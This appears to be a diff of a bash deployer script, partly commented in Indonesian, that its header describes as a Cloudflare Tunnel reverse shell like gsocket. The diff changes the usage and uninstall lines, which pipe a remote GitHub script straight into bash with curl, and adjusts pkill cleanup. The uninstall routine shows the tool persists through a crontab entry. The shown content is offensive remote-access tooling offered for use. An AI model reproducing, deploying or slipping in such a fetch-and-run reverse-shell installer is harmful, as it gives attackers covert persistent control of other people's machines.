@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
-# Cloudflare Tunnel Reverse Shell (like gsocket)
-# Usage: bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/deploy.sh)"
-# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/deploy.sh)"
+# Cloudflare Tunnel Reverse Shell (like gsocket) – Final Fix
+# Usage: bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
+# Uninstall: GS_UNDO=1 bash -c "$(curl -fsSL https://raw.githubusercontent.com/VampXDH/Ocean-Shell/refs/heads/main/dep.sh)"
 
 # ---------- Konfigurasi ----------
 : "${HOME:=/tmp}"
@@ -121,7 +121,7 @@ EOF
 
 uninstall() {
     log "Uninstalling..."
-    pkill -f "$BIN_NAME" 2>/dev/null || true
+    pkill "$BIN_NAME" 2>/dev/null || true
     pkill -f "$PROC_NAME" 2>/dev/null || true
     pkill -f "cf_tunnel.sh" 2>/dev/null || true
     crontab -l 2>/dev/null | grep -v "cf_tunnel.sh" | crontab - 2>/dev/null || true
@@ -133,8 +133,8 @@ uninstall() {
 # ---------- MAIN ----------
 [[ -n "${GS_UNDO:-}" ]] && uninstall
 
-# Bersihkan proses lama
-pkill -f "$BIN_NAME" 2>/dev/null || true
+# Bersihkan proses lama – gunakan pkill tanpa -f untuk binary
+pkill "$BIN_NAME" 2>/dev/null || true
 pkill -f "$PROC_NAME" 2>/dev/null || true
 pkill -f "cf_tunnel.sh" 2>/dev/null || true
 sleep 1
